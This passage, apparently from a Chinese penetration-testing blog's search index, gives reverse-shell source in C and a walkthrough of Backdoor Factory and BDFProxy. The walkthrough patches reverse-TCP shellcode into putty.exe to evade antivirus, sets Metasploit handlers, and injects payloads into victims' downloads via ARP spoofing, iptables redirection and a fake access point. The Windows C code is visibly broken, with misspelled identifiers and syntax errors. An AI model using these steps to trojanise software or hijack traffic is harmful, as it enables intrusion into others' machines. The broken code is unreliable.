      dup2(s,2);
      execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0); //precess httpd
  }</code></pre><ul>
<li>windows.c</li>
</ul>
<pre><code>  # 未修正错误
  #include &lt;winsock2.h&gt;
  #include &lt;stdio.h&gt;

  #pragma comment(lib,&quot;ws2_32&quot;)

      WSADATA wsaData;
      SOCKET Winsock;
      SOOKET Sock;
      struct sockaddr_in hax;
      char ip_addr[16];
      STARTUPINFO ini_processo;
      PROCESS_INFORMATION processo_info;

  int main(int argc,char *argv[])
      WSAStartup(MAKEWORD(2,2), wsaData);
      winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

      if (argc != 3)
      {fprintf(stderr,&quot;Uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;;) exit(1);}
      struct hostent *host;
      host = gethostbyname(argv [1] );
      strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));

      hax.sin_family = AF_INET;
      hax.sin_port = htons(atoi(argv[2]));
      hax.sin_addr.s_addr = inet_addr(ip_addr);

      WSAConnect(Winsock,(SOCKADDR* &amp;hax,sizeof(hax),NULL,NULL,NULL,NULL;
      memset(&amp;ini_processo,0,sizeof(ini_processo));
      ini_processo.cb = sizeof(ini_processo);
      ini_processo.dwFlags = START_USESTDHANDLES;
      ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
      CreateProcess(NULL,&quot;cmd exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;process_info);</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174154985.png" alt="在这里插入图片描述"></p>
<h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>patch<ul>
<li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li>
<li>bdf：向二进制文件中增加或者删除代码内容<ul>
<li>某些受保护的二进制程序无法 patch</li>
<li>存在一定概率问价你会被 patch 坏掉</li>
</ul>
</li>
</ul>
</li>
<li>后门工厂<ul>
<li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li>
<li>支持 msf payload、自定义 payload</li>
</ul>
</li>
<li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li>
<li>python 语言编写</li>
<li>msf 使用的 patch 方法<ul>
<li>覆盖程序入口<ul>
<li>msfvenom -p windows/shell/reverse_tcp</li>
</ul>
</li>
<li>创建新的线程执行 shellcode 并跳回原程序入口<ul>
<li>msfvenom -p windows/shell/reverse_tcp –k</li>
<li>增加代码片段跳转执行后跳回源程序入口</li>
</ul>
</li>
</ul>
</li>
<li>CTP 方法<ul>
<li>增加新的代码段 session，与 smf 的-k 方法类似</li>
<li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li>
</ul>
</li>
<li>代码洞<ul>
<li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li>
<li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li>
</ul>
</li>
<li>单个代码洞代销不足以存放完整的 shellcode<ul>
<li>多代码洞跳转（非顺序执行）<ul>
<li>初期免杀率可达100%</li>
</ul>
</li>
<li>结合 msf 的 stager 方法</li>
</ul>
</li>
<li>patch 选项<ul>
<li>附加代码段</li>
<li>单代码洞注入</li>
<li>多代码注入</li>
</ul>
</li>
<li>BDF 基本使用<ul>
<li>检查二进制文件是否支持代码注入<ul>
<li>backdoor-factory -f putty.exe –S</li>
</ul>
</li>
<li>显示可用 payload<ul>
<li>backdoor-factory -f putty.exe -s show</li>
<li>backdoor-factory -f <code>which nc</code> -s show</li>
<li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li>
<li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li>
<li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li>
</ul>
</li>
<li>查看 cave 大小<ul>
<li>ackdoor-factory -f putty.exe -c -l</li>
</ul>
</li>
</ul>
</li>
<li>免杀效果对比<ul>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li>
<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li>
</ul>
</li>
<li>与 veil-evasion 集成</li>
<li>Linux：backdoor-factory -f putty.exe -s show</li>
<li>IAT：import address table</li>
<li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li>
</ul>
<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
<li><p>-S：检查二进制文件是否支持代码注入</p>
<pre><code>  root@kali:~# backdoor-factory -f putty.exe –S</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145311915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li>
</ul>
<pre><code>  -c：code cave(代码裂缝)
  -l：代码裂缝大小
  root@kali:~# backdoor-factory -f putty.exe -c -l 200</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p>
<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s show</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>  root@kali:~# backdoor-factory -f `which nc` -s show</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>注入 putty.exe，报错</p>
<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>  [!] Enter your selection: 2</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>显示未找到文件</p>
<pre><code>  Failed to read certificate file: /usr/share/backdoor-factory/certs/Verisign.cer
  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem&#39;,&#39;rb&#39;)
  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/Verisign.cer&#39;,&#39;rb&#39;)
  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
  Failed
  File putty5.exe is in the &#39;backdoored&#39; directory</code></pre></li>
<li><p>修复错误（备份并重命名）</p>
<pre><code>  root@kali:~# cat /usr/share/backdoor-factory/certs/
  passFile.txt           signingCert.cer        signingPrivateKey.pem  
  root@kali:~# cd /usr/share/backdoor-factory/certs/

  root@kali:/usr/share/backdoor-factory/certs# cp signingCert.cer signingCert.cer.bak
  root@kali:/usr/share/backdoor-factory/certs# mv signingCert.cer Verisign.cer
  root@kali:/usr/share/backdoor-factory/certs# cp signingPrivateKey.pem signingPrivateKey.pem.bak
  root@kali:/usr/share/backdoor-factory/certs# mv signingPrivateKey.pem VerisignPrivateKey.pem

  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>使用 msf 侦听</p>
<pre><code>  msf &gt; use exploit/multi/handler
  msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
  msf exploit(multi/handler) &gt; set LHOST 10.10.10.131
  msf exploit(multi/handler) &gt; set LPORT 4444
  msf exploit(multi/handler) &gt; run</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145405583.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p>
</li>
<li><p>免杀效果比较</p>
<p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p>
</li>
</ul>
<pre><code>  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty3.exe
  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty4.exe –J
  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty5.exe -a</code></pre><ul>
<li><p>与 veil-evasion 集成</p>
<pre><code>  root@kali:~# veil-evasion
  [menu&gt;&gt;]: list</code></pre></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>Bdfproxy（mitmproxy）<ul>
<li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li>
</ul>
</li>
<li>步骤<ul>
<li>sysctl -w net.ipv4.ip_forward=1</li>
<li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li>
<li>vi /etc/bdfproxy/bdfproxy.cfg<ul>
<li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li>
</ul>
</li>
</ul>
</li>
<li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li>
<li>启动 msf</li>
<li>流程<ul>
<li>mana 创建 Fack AP</li>
<li>badfproxy 代理注入代码</li>
<li>msf 侦听反弹 shell</li>
</ul>
</li>
</ul>
<h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
<li><p>修改 IP 转发</p>
<pre><code>root@kali:~# vim /etc/sysctl.conf 
net.ipv4.ip_forward=1</code></pre></li>
<li><p>修改 iptables</p>
<pre><code>root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</code></pre></li>
<li><p>修改配置文件</p>
<pre><code>root@kali:~# vim /etc/bdfproxy/bdfproxy.cfg
proxyMode = transparent  
HOST = 10.10.10.131     #108行，117行，128行，替换所有的，有6个</code></pre></li>
<li><p>启动 bdfproxy</p>
<pre><code>root@kali:~# bdfproxy</code></pre></li>
<li><p>启动 msfconsole</p>
<pre><code>root@kali:~# msfconsole -r /root/bdfproxy_msf_resource.rc
msf exploit(multi/handler) &gt; jobs</code></pre></li>
</ul>
<ul>
<li><p>arp 欺骗</p>
<pre><code>root@kali:~# arpspoof -i eth0 -t 10.10.10.133 10.10.10.2</code></pre></li>
<li><p>靶机访问浏览器下载软件，并运行</p>
<pre><code>![](https://i.imgur.com/1qLFgFZ.png)</code></pre></li>
</ul>
<h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul>
<li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p>
<ul>
<li>修改无线 SSID 名称</li>
</ul>
</li>
<li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p>
<ul>
<li>修改 wlan1 无线网卡适配器并启动</li>
<li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li>
</ul>
</li>
<li><p>vi /etc/bdfproxy/bdfproxy.cfg</p>
<ul>
<li>proxyMode = transparent</li>
<li>修改侦听 IP 地址并启动 badfproxy</li>
</ul>
</li>
<li><p>启动 msf</p>
<ul>
<li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li>
</ul>
</li>
<li><p>补充内容</p>
<ul>
<li>全站 HTTPS 防注入（微软每个补丁都带码）</li>
<li>PE 文件证书签名可被清除</li>
<li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul>
<li>全部用 0 覆盖</li>
<li>BDF 默认清除数字签名</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p>
<ul>
<li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li>
<li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li>
</ul>
</li>
<li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p>
<ul>
<li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>重定向技术</title>
    <url>/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
